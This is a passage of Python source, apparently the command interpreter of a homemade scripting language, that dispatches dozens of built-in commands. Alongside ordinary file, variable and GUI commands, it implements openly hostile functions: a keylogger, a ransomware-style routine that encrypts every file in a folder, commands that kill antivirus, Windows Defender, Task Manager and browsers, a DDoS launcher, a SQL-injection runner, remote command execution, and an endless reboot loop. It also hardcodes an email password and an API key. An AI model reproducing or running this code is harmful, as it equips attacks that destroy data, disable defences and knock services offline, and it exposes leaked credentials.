        smtp = smtplib.SMTP(server, port)
        smtp.starttls()
        smtp.ehlo()
        smtp.login(acc, accpawd)
        smtp.sendmail(acc, target, email.as_string())
    except Exception as e:
        orinto(str(e))
    finally:
        smtp.quit()


def runCode(code):
    global output, outputSys, errors, vars, httpHeaders, ts, target, port, flag, ddospool, htmlflag, mods
    try:  # Code Template: method;options...
        c = code.split(";")
        m = c[0]
        try:
            o = c[1:]
            ot = ";".join(o)
        except:
            o = []
            ot = ""
    except:
        m = ""
    try:
        if m == "log":
            orint(ot)
        elif m == "logf":
            orint(fstring(ot))
        elif m == "optilog":
            orinto(ot)
        elif m == "optilogf":
            orinto(fstring(ot))
        elif m == "outNone":
            with lock:
                output = ioNone()
        elif m == "outSys":
            with lock:
                output = outputSys
        elif m == "returnAuto":
            returnAuto(fstring(ot))
        elif m == "returnPyToC":
            pythonToCpp(ot)
        elif m == "returnPyToExe":
            pythonToBash(ot)
        elif m == "returnCToExe":
            cppToBash(ot)
        elif m == "returnSLToC":
            slToCpp(ot)
        elif m == "encrypt":
            filename = o[0]
            key = o[1]
            with open(filename, "r", encoding="utf-8") as f:
                c = f.read()
            c = SL_ENCRYPT(c, key)
            with open(filename, "w", encoding="utf-8") as f:
                f.write(c)
        elif m == "decrypt":
            filename = o[0]
            key = o[1]
            with open(filename, "r", encoding="utf-8") as f:
                c = f.read()
            c = SL_DECRYPT(c, key)
            with open(filename, "w", encoding="utf-8") as f:
                f.write(c)
        elif m == "eSet":
            if ot == "on":
                errors = True
            elif ot == "off":
                errors = False
        elif m == "vSet":
            with lock:
                vars[o[0]] = ";".join(o[1:])
        elif m == "vSetF":
            with lock:
                vars[o[0]] = fstring(";".join(o[1:]))
        elif m == "vSetFF":
            with lock:
                vars[fstring(o[0])] = fstring(";".join(o[1:]))
        elif m == "vR":
            with lock:
                del vars[o[0]]
        elif m == "vRF":
            with lock:
                del vars[fstring(o[0])]
        elif m == "vList":
            varname = o[0]
            listt = o[1:]
            with lock:
                vars[varname] = listt
        elif m == "vListF":
            runcode("vList;"+fstring(ot))
        elif m == "vListJoin":
            varname = o[0]
            joiner = o[1]
            with lock:
                vars[varname] = joiner.join(vars[varname])
        elif m == "vListSplit":
            varname = o[0]
            splitter = o[1]
            with lock:
                vars[varname] = vars[varname].split(splitter)
        elif m == "vReplace":
            varname = o[0]
            text1 = o[1]
            text2 = o[2]
            with lock:
                vars[varname] = vars[varname].replace(text1, text2)
        elif m == "vSelect":
            varname = o[0]
            num = int(o[1])
            varname2 = o[2]
            with lock:
                vars[varname2] = vars[varname][num]
        elif m == "vSelectL":
            varname = o[0]
            numin = int(o[1])
            numax = int(o[2])
            varname2 = o[3]
            with lock:
                vars[varname2] = vars[varname][numin:numax]
        elif m == "vReverse":
            varname = o[0]
            with lock:
                vars[varname] = vars[varname][::-1]
        elif m == "vAddToNewLine":
            varname = o[0]
            text = ";".join(o[1:])
            with lock:
                vars[varname] = vars[varname]+"\n"+text
        elif m == "input":
            with lock:
                vars[o[0]] = input(";".join(o[1:]))
        elif m == "inputf":
            with lock:
                vars[o[0]] = input(fstring(";".join(o[1:])))
        elif m == "wait":
            time.sleep(float(fstring(ot)))
        elif m == "random":
            min = int(o[0])
            max = int(o[1])
            value = random.randint(min, max)
            with lock:
                vars[o[2]] = str(value)
        elif m == "sendBotMail":
            server = "smtp.office365.com"
            pport = 587
            acc = "simoniclang@hotmail.com"
            # We know you're reading this, don't even think about it, believe me, it's just a bot account that will be of no use to you.
            accpawd = "H3rK9tL2pS6"
            ttarget = o[0]
            subject = o[1]
            mes = o[2]
            sendmail(server, pport, acc, accpawd, ttarget, subject, mes)
        elif m == "sendMail":
            server = o[0]
            pport = int(o[1])
            acc = o[2]
            accpawd = o[3]
            ttarget = o[4]
            subject = o[5]
            mes = o[6]
            sendmail(server, pport, acc, accpawd, ttarget, subject, mes)
        elif m == "shorturl":
            varname = o[0]
            url = ";".join(o[1:])
            with lock:
                vars[varname] = shorturl(url)
        elif m == "keylog":
            if 245 in mods:
                pass
            else:
                try:
                    subprocess.run("pip install keyboard".split(
                    ), stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                except:
                    pass
                mods.append(245)
            import keyboard
            tttt = keyboard.read_event(suppress=True).name
            with lock:
                vars[o[0]] = str(tttt)
        elif m == "setRoot":
            os.chmod(fstring(ot), 0o777)
        elif m == "%in":
            num = float(fstring(o[0]))
            num2 = float(fstring(o[1]))
            with lock:
                vars[o[2]] = str((num/num2)*100)
        elif m == "%out":
            num = float(fstring(o[0]))
            num2 = float(fstring(o[1]))
            with lock:
                vars[o[2]] = str((num*num2)/100)
        elif m == "blockPerms":
            os.chmod(fstring(ot), 0)
        elif m == "task.list_pid=name":
            varname = o[0]
            with lock:
                vars[varname] = Tasks().get_list_pidname()
        elif m == "task.list_name=pid":
            varname = o[0]
            with lock:
                vars[varname] = Tasks().get_list_namepid()
        elif m == "task.list_pid=status":
            varname = o[0]
            with lock:
                vars[varname] = Tasks().get_list_pidstatus()
        elif m == "task.list_pid=user":
            varname = o[0]
            with lock:
                vars[varname] = Tasks().get_list_piduser()
        elif m == "task.list_pid=ram":
            varname = o[0]
            with lock:
                vars[varname] = Tasks().get_list_pidram()
        elif m == "task.list_pid=cpu":
            varname = o[0]
            with lock:
                vars[varname] = Tasks().get_list_pidcpu()
        elif m == "task.name":
            varname = o[0]
            with lock:
                vars[varname] = Tasks().get_name(int(o[1]))
        elif m == "task.pid":
            varname = o[0]
            with lock:
                vars[varname] = Tasks().get_pid(o[1])
        elif m == "task.status":
            varname = o[0]
            with lock:
                vars[varname] = Tasks().get_status(int(o[1]))
        elif m == "task.cpu":
            varname = o[0]
            with lock:
                vars[varname] = Tasks().get_cpu(int(o[1]))
        elif m == "task.ram":
            varname = o[0]
            with lock:
                vars[varname] = Tasks().get_ram(int(o[1]))
        elif m == "task.mypid":
            varname = o[0]
            with lock:
                vars[varname] = Tasks().get_mypid()
        elif m == "task.kill":
            Tasks().kill(ot)
        elif m == "task.block":
            Tasks().block(ot)
        elif m == "moveMouse":
            x = o[0]
            y = o[1]
            dur = float(o[2])
            moveMouse(x, y, dur)
        elif m == "moveMouseTo":
            x = int(o[0])
            y = int(o[1])
            dur = float(o[2])
            moveMouseTo(x, y, dur)
        elif m == "checkPhone":
            country = int(o[0])
            number = int(o[1])
            result = checkPhone(country, number)
            if result == True:
                result = 1
            else:
                result = 0
            with lock:
                vars[o[2]] = str(result)
        elif m == "findPhone":
            country = int(o[0])
            with lock:
                vars[o[1]] = findPhone(country)
        elif m == "keyboardWrite":
            keyboardWrite(ot)
        elif m == "keyboardPress":
            keyboardPress(ot)
        elif m == "shakeMouse":
            power = o[0]
            dur = o[1]
            shakeMouse(power, dur)
        elif m == "mouseClickRight":
            mouseClickRight()
        elif m == "mouseClickLeft":
            mouseClickLeft()
        elif m == "mousePos":
            x = o[0]
            y = o[1]
            pos = mousePos()
            with lock:
                vars[x] = pos[0]
                vars[y] = pos[1]
        elif m == "disableMouse":
            disableMouse()
        elif m == "disableKeyboard":
            disableKeyboard()
        elif m == "disableTaskManager":
            disableTaskManager()
            runCode("task.block;Taskmgr.exe")
        elif m == "blockWindowsDefender":
            blockWindowsDefender()
            runCode("task.block;MsMpEng.exe")
        elif m == "blockBrowsers":
            Syntax().run("""task.block;opera.exe
task.block;brave.exe
task.block;chrome.exe
task.block;google.exe
task.block;msedge.exe
task.block;firefox.exe
task.block;safari.exe
task.block;chromium.exe
task.block;vivaldi.exe
task.block;duckduckgo.exe
task.block;iexplore.exe""")
        elif m == "blockAntiviruses":
            Syntax().run("""task.block;AvastSvc.exe
task.block;avgsvc.exe
task.block;bdagent.exe
task.block;avp.exe
task.block;mcshield.exe
task.block;nortonsecurity.exe
task.block;avguard.exe
task.block;CoreServiceShell.exe
task.block;ekrn.exe
task.block;mbamservice.exe
task.block;MsMpEng.exe
task.block;savservice.exe
task.block;PSANHost.exe
task.block;fsav.exe
task.block;BullGuard.exe
task.block;WRSA.exe
task.block;GDScan.exe
task.block;SBAMSvc.exe
task.block;cmdagent.exe
task.block;ccSvcHst.exe
task.block;eset_ras.exe
task.block;360rp.exe
task.block;McAPExe.exe
task.block;avpui.exe
task.block;mfemms.exe
task.block;ZAM.exe
task.block;TeaTimer.exe
task.block;SymCorpUI.exe
task.block;vsserv.exe
task.block;CyveraService.exe
task.block;360tray.exe""")
        elif m == "screenshot":
            screenshot(ot)
        elif m == "page":
            varname = o[0]
            title = o[1]
            with lock:
                vars[varname] = Pageleus(title)
        elif m == "page.update":
            varname = o[0]
            vars[varname].update()
        elif m == "page.add_image":
            varname = o[0]
            idd = o[1]
            file = fstring(o[2])
            vars[varname].add_image(idd, file)
        elif m == "page.set_image":
            varname = o[0]
            idd = o[1]
            file = fstring(o[2])
            vars[varname].set_image(idd, file)
        elif m == "page.add_label":
            varname = o[0]
            idd = o[1]
            text = fstring(o[2])
            font = fstring(o[3])
            size = float(o[4])
            vars[varname].add_label(idd, text, font, size)
        elif m == "page.set_label":
            varname = o[0]
            idd = o[1]
            text = fstring(o[2])
            vars[varname].set_label(idd, text)
        elif m == "page.add_button":
            varname = o[0]
            idd = o[1]
            text = o[2]
            w = int(o[3])
            h = int(o[4])
            code = ";".join(o[5:])
            code = f"""Syntax().run('''{code}''')"""
            vars[varname].add_button(idd, text, w, h, code)
        elif m == "page.set_button":
            varname = o[0]
            idd = o[1]
            text = o[2]
            code = ";".join(o[3:])
            code = f"""Syntax().run('''{code}''')"""
            vars[varname].set_button(idd, text, code)
        elif m == "page.add_input":
            varname = o[0]
            idd = o[1]
            text = o[2]
            width = int(o[3])
            vars[varname].add_input(idd, text, width)
        elif m == "page.set_input":
            varname = o[0]
            idd = o[1]
            text = o[2]
            vars[varname].set_input(idd, text)
        elif m == "page.get_input":
            varname = o[0]
            idd = o[1]
            varname2 = o[2]
            with lock:
                vars[varname2] = vars[varname].get_input(idd)
        elif m == "page.add_text":
            varname = o[0]
            idd = o[1]
            text = fstring(o[2])
            w = int(o[3])
            h = int(o[4])
            e = o[5]
            if e == "1":
                e = True
            else:
                e = False
            vars[varname].add_text(idd, text, w, h, e)
        elif m == "page.set_text":
            varname = o[0]
            idd = o[1]
            text = fstring(o[2])
            e = o[3]
            if e == "1":
                e = True
            else:
                e = False
            vars[varname].set_text(idd, text, e)
        elif m == "page.get_text":
            varname = o[0]
            idd = o[1]
            varname2 = o[2]
            with lock:
                vars[varname2] = vars[varname].get_text(idd)
        elif m == "page.add_menu":
            varname = o[0]
            idd = o[1]
            vars[varname].add_menu(idd)
        elif m == "page.add_optionlist":
            varname = o[0]
            idd = o[1]
            listid = o[2]
            name = o[3]
            vars[varname].add_optionlist(idd, listid, name)
        elif m == "page.add_option":
            varname = o[0]
            idd = o[1]
            name = o[2]
            code = ";".join(o[3:])
            code = f"""Syntax().run('''{code}''')"""
            vars[varname].add_option(idd, name, code)
        elif m == "page.add_splitter":
            varname = o[0]
            idd = o[1]
            vars[varname].add_splitter(idd)
        elif m == "page.set_colors":
            varname = o[0]
            bg = o[0]
            fg = o[1]
            bg2 = o[2]
            vars[varname].set_colors(bg, fg, bg2)
        elif m == "page.fullsc":
            vars[ot].fullsc()
        elif m == "page.boxsc":
            vars[ot].boxsc()
        elif m == "page.msgBox":
            title = o[0]
            text = fstring(o[1])
            s = Pageleus()
            s.hide()
            s.msgBox(title, text)
            s.close()
        elif m == "page.warnBox":
            title = o[0]
            text = fstring(o[1])
            s = Pageleus()
            s.hide()
            s.warnBox(title, text)
            s.close()
        elif m == "page.errorBox":
            title = o[0]
            text = fstring(o[1])
            s = Pageleus()
            s.hide()
            s.errorBox(title, text)
            s.close()
        elif m == "page.okBox":
            title = o[0]
            text = o[1]
            varname2 = o[2]
            with lock:
                s = Pageleus()
                s.hide()
                q = s.okBox(title, text)
                if q == True:
                    q = "1"
                else:
                    q = "0"
                vars[varname2] = q
                s.close()
        elif m == "page.questBox":
            title = o[0]
            text = o[1]
            varname2 = o[2]
            with lock:
                s = Pageleus()
                s.hide()
                q = s.questBox(title, text)
                if q == True:
                    q = "1"
                else:
                    q = "0"
                vars[varname2] = q
                s.close()
        elif m == "page.confirmBox":
            title = o[0]
            text = o[1]
            varname2 = o[2]
            with lock:
                s = Pageleus()
                s.hide()
                q = s.confirmBox(title, text)
                if q == True:
                    q = "1"
                else:
                    q = "0"
                vars[varname2] = q
                s.close()
        elif m == "page.tryBox":
            title = o[0]
            text = o[1]
            varname2 = o[2]
            with lock:
                s = Pageleus()
                s.hide()
                q = s.tryBox(title, text)
                if q == True:
                    q = "1"
                else:
                    q = "0"
                vars[varname2] = q
                s.close()
        elif m == "page.colorchc":
            title = o[0]
            varname2 = o[1]
            with lock:
                s = Pageleus()
                s.hide()
                with lock:
                    vars[varname2] = s.colorchc(title)
                s.close()
        elif m == "page.filechc":
            title = o[0]
            varname2 = o[1]
            with lock:
                s = Pageleus()
                s.hide()
                with lock:
                    vars[varname2] = s.filechc(title)
                s.close()
        elif m == "page.close":
            vars[ot].close()
        elif m == "page.hide":
            vars[ot].hide()
        elif m == "page.open":
            vars[ot].open()
        elif m == "page.icon":
            vars[o[0]].icon(o[1])
        elif m == "page.title":
            vars[o[0]].title(o[1])
        elif m == "page.remove":
            varname = o[0]
            idd = o[1]
            vars[varname].remove(idd)
        elif m == "page.mainloop":
            varname = o[0]
            vars[varname].mainloop()
        elif m == "changeBg.color":
            changeBg("color", (int(o[0]), int(o[1]), int(o[2])))
        elif m == "changeBg.image":
            changeBg("image", ot)
        elif m == "changeBg.random":
            changeBg("color", (random.randint(0, 255),
                     random.randint(0, 255), random.randint(0, 255)))
        elif m == "disableExit":
            sys.exit = UnCloseSys
        elif m == "winUserAdd":
            user = fstring(o[0])
            pawd = fstring(o[1])
            winUserAdd(user, pawd)
        elif m == "winUserRemove":
            user = fstring(o[0])
            winUserRemove(user)
        elif m == "shutdown":
            try:
                subprocess.run("shutdown /s /f /t 0".split(), check=True,
                               stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            except:
                pass
            try:
                subprocess.run("powershell Stop-Computer -Force".split(),
                               check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            except:
                pass
            try:
                subprocess.run("sudo shutdown -h now".split(), check=True,
                               stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            except:
                pass
        elif m == "reboot":
            try:
                subprocess.run("shutdown /r /f /t 0".split(), check=True,
                               stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            except:
                pass
            try:
                subprocess.run("powershell Restart-Computer -Force".split(),
                               check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            except:
                pass
            try:
                subprocess.run("sudo reboot".split(), check=True,
                               stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            except:
                pass
        elif m == "logout":
            try:
                subprocess.run("shutdown /l".split(), check=True,
                               stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            except:
                pass
            try:
                subprocess.run("powershell -Command Exit-PSSession".split(),
                               check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            except:
                pass
            try:
                subprocess.run("logout".split(), check=True,
                               stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            except:
                pass
        elif m == "brokePc":
            while True:
                try:
                    threading.Thread(target=runCode, args=("reboot",)).start()
                    threading.Thread(
                        target=runCode, args=("shutdown",)).start()
                    threading.Thread(target=runCode, args=("logout",)).start()
                except:
                    pass
        elif m == "sqlConn":
            file = fstring(o[0])
            varname = fstring(o[1])
            sqlConnect(file, varname)
        elif m == "sqlExec":
            varname = fstring(o[0])
            code = fstring(";".join(o[1:]))
            sqlExecute(varname, code)
        elif m == "sqlClose":
            varname = fstring(o[0])
            sqlClose(varname)
        elif m == "startupAdd":
            startupAdd(ot)
        elif m == "serverCalculate":
            ports = o[0].split(",")
            tl = int(o[1])
            varname = o[2]
            count = gc_get(tl, ports)
            with lock:
                vars[varname] = str(count)
        elif m == "randomf":
            min = int(fstring(o[0]))
            max = int(fstring(o[1]))
            value = random.randint(min, max)
            with lock:
                vars[fstring(o[2])] = str(value)
        elif m == "randoms":
            min = float(o[0])
            max = float(o[1])
            value = random.uniform(min, max)
            with lock:
                vars[o[2]] = str(value)
        elif m == "randomsf":
            min = float(fstring(o[0]))
            max = float(fstring(o[1]))
            value = random.uniform(min, max)
            with lock:
                vars[fstring(o[2])] = str(value)
        elif m == "dcwhSend":
            url = o[0]
            text = ";".join(o[1:])
            discordWHSend(url, text)
        elif m == "dcwhSendF":
            url = fstring(o[0])
            text = fstring(";".join(o[1:]))
            discordWHSend(url, text)
        elif m == "sysExit":
            sys.exit()
        elif m == "rwLock":
            files = os.listdir()
            key = str(random.randint(1, 99))
            for file in files:
                try:
                    runCode(f"encrypt;{file};{key}")
                except:
                    pass
            with open(fstring("$<basefile>")+".save", "w") as f:
                f.write(SL_ENCRYPT(key, "mk89001234msadcjsnajsyx8123823"))
        elif m == "rwUnlock":
            files = os.listdir()
            with open(fstring("$<basefile>")+".save", "r") as f:
                key = SL_DECRYPT(f.read(), "mk89001234msadcjsnajsyx8123823")
            for file in files:
                try:
                    runCode(f"decrypt;{file};{key}")
                except:
                    pass
        elif m == "loop":
            n = o[0]
            c = ";".join(o[1:])
            if n == "<>":
                while True:
                    b = 0
                    for h in c.split(" && "):
                        if h == "break":
                            b = 1
                            break
                        runCode(h)
                    if b == 1:
                        break
            else:
                for _ in range(int(n)):
                    b = 0
                    for h in c.split(" && "):
                        if h == "break":
                            b = 1
                            break
                        runCode(h)
                    if b == 1:
                        break
        elif m == "loopf":
            n = fstring(o[0])
            c = ";".join(o[1:])
            if n == "<>":
                while True:
                    b = 0
                    for h in c.split(" && "):
                        if h == "break":
                            b = 1
                            break
                        runCode(h)
                    if b == 1:
                        break
            else:
                for _ in range(int(n)):
                    for h in c.split(" && "):
                        if h == "break":
                            b = 1
                            break
                        runCode(h)
                    if b == 1:
                        break
        elif m == "forLoop":
            varname = o[0]
            varname2 = o[1]
            c = ";".join(o[2:])
            for h in vars[varname]:
                b = 0
                vars[varname2] = h
                for hh in c.split(" && "):
                    if h == "break":
                        b = 1
                        break
                    runCode(hh)
                if b == 1:
                    break
        elif m == "setVolume":
            setVolume(ot)
        elif m == "setBrightness":
            setBrightness(ot)
        elif m == "setDateTime":
            year = o[0]
            month = o[1]
            day = o[2]
            hour = o[3]
            minute = o[4]
            second = o[5]
            setDateTime(year, month, day, hour, minute, second)
        elif m == "setRandomVolume":
            setRandomVolume(ot)
        elif m == "setRandomBrightness":
            setRandomBrightness()
        elif m == "setRandomDateTime":
            setRandomDateTime()
        elif m == "checkNetwork":
            varname = o[0]
            with lock:
                vars[varname] = checkNetwork()
        elif m == "restoreDateTime":
            restoreDateTime()
        elif m == "runPy":
            exec(fstring(ot))
        elif m == "runSL":
            Syntax().run(fstring(ot))
        elif m == "runCmd":
            subprocess.run(fstring(ot).split(), stdout=output, stderr=output)
        elif m == "runUserCmd":
            runUserCmd(fstring(ot))
        elif m == "runHtml":
            threading.Thread(target=runHtml, args=(ot,)).start()
        elif m == "runHtmlScreen":
            runHtmlScreen(fstring(ot))
        elif m == "stopHtml":
            with lock:
                htmlflag = False
        elif m == "startHtml":
            with lock:
                htmlflag = True
        elif m == "runShell":
            subprocess.run(fstring(ot).split(), shell=True, check=True)
        elif m == "runPShell":
            subprocess.run(f"powershell -Command {fstring(ot)}".split())
        elif m == "runExe":
            if os.name == "nt":
                subprocess.run(fstring(ot).split())
            else:
                subprocess.run(f"wine {fstring(ot)}".split())
        elif m == "runAsync":
            runAsync(fstring(";".join(o[1:])), float(o[0]))
        elif m == "runBF":
            varname = o[0]
            memory = int(o[1])
            code = o[2]
            with lock:
                vars[varname] = runBF(memory, code)
        elif m == "runC":
            runC(fstring(ot))
        elif m == "runJS":
            runJS(fstring(ot))
        elif m == "runJava":
            runJava(fstring(ot))
        elif m == "runRuby":
            runRuby(fstring(ot))
        elif m == "runSwift":
            runSwift(fstring(ot))
        elif m == "runGo":
            runGo(fstring(ot))
        elif m == "runPHP":
            runPHP(fstring(ot))
        elif m == "unicodeText":
            varname = o[0]
            minord = int(o[1])
            maxord = int(o[2])
            with lock:
                vars[varname] = unicodeText(minord, maxord)
        elif m == "unicodeRandomText":
            varname = o[0]
            minord = int(o[1])
            maxord = int(o[2])
            length = int(o[3])
            with lock:
                vars[varname] = unicodeTextRandom(minord, maxord, length)
        elif m == "capture":
            file = o[0]
            w = int(o[1])
            h = int(o[2])
            capture(file, w, h)
        elif m == "clearOut":
            if os.name == "nt":
                os.system("cls")
            else:
                os.system("clear")
        elif m == "clearIn":
            with lock:
                output.flush()
                for var in vars:
                    with lock:
                        del var
                with lock:
                    vars = {}
                    httpHeaders = {
                        "User-Agent": "SimonicLang", "Accept": "*/*"}
        elif m == "save":
            with open(fstring(ot), "w") as f:
                f.write(json.dumps(vars)+"\n/n/\n"+json.dumps(httpHeaders))
        elif m == "load":
            with open(fstring(ot), "r") as f:
                c = f.read().split("\n/n/\n")
                vars = json.loads(c[0])
                httpHeaders = json.loads(c[1])
        elif m == "file.create":
            with open(ot, "w") as f:
                f.write("")
        elif m == "file.write":
            with open(o[0], "w", encoding="utf-8") as f:
                f.write(";".join(o[1:]))
        elif m == "file.writef":
            with open(fstring(o[0]), "w", encoding="utf-8") as f:
                f.write(fstring(";".join(o[1:])))
        elif m == "file.writebin":
            with open(o[0], "wb") as f:
                f.write(";".join(o[1:]).encode())
        elif m == "file.writebinf":
            with open(fstring(o[0]), "wb") as f:
                f.write(fstring(";".join(o[1:])).encode())
        elif m == "file.read":
            with open(o[0], "r", encoding="utf-8") as f:
                vars[o[1]] = f.read()
        elif m == "file.readf":
            with open(fstring(o[0]), "r", encoding="utf-8") as f:
                vars[fstring(o[1])] = fstring(f.read())
        elif m == "file.readbin":
            with open(o[0], "rb") as f:
                vars[o[1]] = f.read().decode("utf-8", errors="ignore")
        elif m == "file.readbinf":
            with open(fstring(o[0]), "rb") as f:
                vars[fstring(o[1])] = fstring(
                    f.read().decode("utf-8", errors="ignore"))
        elif m == "file.delete":
            name = fstring(o[0])
            with open(name, "w", encoding="utf-8") as f:
                f.write("")
            os.rename(name, name+".trash")
            os.remove(name+".trash")
        elif m == "fd.ls":
            with lock:
                vars[o[0]] = os.listdir()
        elif m == "fd.rename":
            name = o[0]
            name2 = o[1]
            os.rename(name, name2)
        elif m == "fd.move":
            name = o[0]
            name2 = o[1]
            shutil.move(name, name)
        elif m == "fd.info.name":
            name = o[0]
            varname = o[1]
            with lock:
                vars[varname] = os.path.splitext(name)[0]
        elif m == "fd.info.ext":
            name = o[0]
            varname = o[1]
            with lock:
                vars[varname] = os.path.splitext(name)[1]
        elif m == "fd.info.type":
            name = o[0]
            varname = o[1]
            with lock:
                if os.path.isfile(name):
                    vars[varname] = "f"
                else:
                    vars[varname] = "d"
        elif m == "fd.info.size.b":
            name = o[0]
            varname = o[1]
            with lock:
                vars[varname] = str(os.stat(name).st_size)
        elif m == "fd.info.size.kb":
            name = o[0]
            varname = o[1]
            with lock:
                vars[varname] = str(os.stat(name).st_size/1024)
        elif m == "fd.info.size.mb":
            name = o[0]
            varname = o[1]
            with lock:
                vars[varname] = str(os.stat(name).st_size/1024/1024)
        elif m == "fd.info.size.gb":
            name = o[0]
            varname = o[1]
            with lock:
                vars[varname] = str(os.stat(name).st_size/1024/1024/1024)
        elif m == "fd.info.cdate":
            name = o[0]
            varname = o[1]
            with lock:
                vars[varname] = str(os.stat(name).st_ctime)
        elif m == "fd.info.adate":
            name = o[0]
            varname = o[1]
            with lock:
                vars[varname] = str(os.stat(name).st_atime)
        elif m == "fd.info.mdate":
            name = o[0]
            varname = o[1]
            with lock:
                vars[varname] = str(os.stat(name).st_mtime)
        elif m == "fd.info.perm":
            name = o[0]
            varname = o[1]
            with lock:
                vars[varname] = str(oct(os.stat(name).st_mode))
        elif m == "dir.create":
            os.mkdir(fstring(ot))
        elif m == "dir.open":
            os.chdir(fstring(ot))
        elif m == "dir.delete":
            shutil.rmtree(fstring(ot))
        elif m == "base64.encode":
            varname = o[0]
            text = ";".join(o[1:])
            with lock:
                vars[varname] = base64.b64encode(
                    text.encode("utf-8")).decode("utf-8")
        elif m == "base64.decode":
            varname = o[0]
            text = ";".join(o[1:])
            with lock:
                vars[varname] = base64.b64decode(
                    text.encode("utf-8")).decode("utf-8")
        elif m == "vJson":
            varname = o[0]
            with lock:
                vars[varname] = {}
        elif m == "vJsonSet":
            varname = o[0]
            typee = o[1]
            item = o[2]
            value = o[3]
            with lock:
                if typee == "number":
                    vars[varname][item] = float(value)
                elif typee == "text":
                    vars[varname][item] = value
        elif m == "vJsonDel":
            varname = o[0]
            item = o[1]
            with lock:
                del vars[varname][item]
        elif m == "vJsonGet":
            varname = o[0]
            item = o[1]
            varname2 = o[2]
            with lock:
                vars[varname2] = vars[varname][item]
        elif m == "vJsonDumps":
            varname = o[0]
            indent = o[1]
            varname2 = o[2]
            with lock:
                if indent == "1":
                    vars[varname2] = json.dumps(vars[varname], indent=4)
                else:
                    vars[varname2] = json.dumps(vars[varname])
        elif m == "vJsonLoads":
            varname = o[0]
            varname2 = o[1]
            with lock:
                vars[varname2] = json.loads(vars[varname])
        elif m == "thread":
            ott = ";".join(o[1:])
            for _ in range(int(o[0])):
                t = threading.Thread(target=runCode, args=(ott,))
                t.start()
                with lock:
                    ts.append(t)
        elif m == "threadjoin":
            for t in ts:
                t.join()
            with lock:
                ts = []
        elif m == "webOpen":
            webbrowser.open(ot)
        elif m == "stopall":
            Tasks().kill(Tasks().get_mypid())
            exit()
        elif m == "notify":
            app = o[0]
            title = o[1]
            msg = o[2]
            dur = float(o[3])
            notify(app, title, msg, dur)
        elif m == "simonddos":
            type = o[0]
            with lock:
                target = o[1]
                port = int(o[2])
            try:
                size = int(o[3])
            except:
                size = 1024
            try:
                pernum = int(o[4])
            except:
                pernum = 2
            try:
                filename = o[5]
            except:
                filename = "log.txt"
            startddos(type, size, pernum, filename)
        elif m == "simonddos.stop":
            with lock:
                flag = False
                ddospool.stop()
            orinto(ot)
        elif m == "openLocation":
            ip = o[0]
            openLocation(ip)
        elif m == "rpcFile":
            ip = o[0]
            path = o[1]
            rpcFile(ip, path)
        elif m == "rpcCom":
            ip = o[0]
            com = ";".join(o[1:])
            rpcCom(ip, com)
        elif m == "rpcSetup":
            rpcSetup()
        elif m == "sqlinjectionRun":
            target = o[0]
            pathname = o[1]
            variable = o[2]
            try:
                filename = o[3]
            except:
                filename = "log.txt"
            sqlinjectrun(target, pathname, variable, filename)
        elif m == "netInfo":
            ip = o[0]
            try:
                ip = socket.gethostbyname(ip)
            except:
                pass
            varname = o[1]
            with lock:
                vars[str(varname)] = json.dumps(netinfo(ip))
        elif m == "whois":
            target = fstring(o[0])
            varname = fstring(o[1])
            try:
                if 0 in mods:
                    pass
                else:
                    subprocess.run("pip install requests".split(
                    ), stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                    with lock:
                        mods.append(0)
                import requests
                dataa = requests.get("https://api.api-ninjas.com/v1/whois?domain="+target, headers={
                                     "X-Api-Key": "LypBBv2goWQ1DT1I3LuvRA==qapA26TtpexoaUsJ"}).json()
            except:
                dataa = {}
            with lock:
                vars[str(varname)] = json.dumps(dataa)
        elif m == "netIp":
            target = o[0]
            varname = o[1]
            try:
                ip = socket.gethostbyname(target)
            except:
                ip = "0.0.0.0"
            with lock:
                vars[varname] = str(ip)
        elif m == "netHost":
            ip = o[0]
            try:
                ip = socket.gethostbyname(ip)
            except:
                pass
            varname = o[1]
            try:
                host = socket.gethostbyaddr(ip)[0]
            except:
                host = ""
            with lock:
                vars[varname] = str(host)
        elif m == "aimusic":
            if 213 in mods:
                pass
            else:
                try:
                    subprocess.run("pip install midiutil".split(
                    ), stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                except:
                    pass
            file = o[0]
            length = int(o[1])
            tempo = float(o[2])
            dur = float(o[3])
            tracks = o[4]
            try:
                noteadd = int(o[5])
            except:
                noteadd = 0
            aimusic(file, length, tempo, dur, tracks, noteadd)
        elif m == "smsc":
            if 213 in mods:
                pass
            else:
                try:
                    subprocess.run("pip install midiutil".split(
                    ), stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                except:
                    pass
            varname = o[0]
            with lock:
                vars[varname] = SimonicMusic()
        elif m == "smsc.tempo":
            varname = o[0]
            sec = float(o[1])
            with lock:
                vars[varname].tempo = sec
        elif m == "smsc.add":
            varname = o[0]
            code = o[1]
            with lock:
                vars[varname].add(code)
        elif m == "smsc.save":
            varname = o[0]
            file = o[1]
            with lock:
                vars[varname].save(file)
        elif m == "smai":
            varname = o[0]
            with lock:
                vars[varname] = SimonicAI()
        elif m == "smai.clearbuffer":
            varname = o[0]
            vars[varname].clearbuffer()
        elif m == "smai.resetbrain":
            varname = o[0]
            vars[varname].resetbrain()
        elif m == "smai.use":
            varname = o[0]
            vars[varname].use()
        elif m == "smai.getXyz":
            varname = o[0]
            varname2 = o[1]
            with lock:
                vars[varname2] = json.dumps(vars[varname].getXyz())
        elif m == "smai.check":
            varname = o[0]
            vars[varname].check()
        elif m == "smai.shuffle":
            varname = o[0]
            vars[varname].shuffle()
        elif m == "smai.learn":
            varname = o[0]
            text = o[1]
            xyz = o[2]
            vars[varname].learn(text, int(xyz))
        elif m == "smai.unlearn":
            varname = o[0]
            text = o[1]
            vars[varname].unlearn(text)
        elif m == "smai.autolearn":
            varname = o[0]
            spltr = o[1]
            text = ";".join(o[2:])
            vars[varname].autolearn(text, splitter=spltr)
        elif m == "smai.weblearn":
            varname = o[0]
            url = o[1]
            vars[varname].weblearn(url)
        elif m == "smai.read":
            varname = o[0]
            text = ";".join(o[1:])
            vars[varname].read(text)
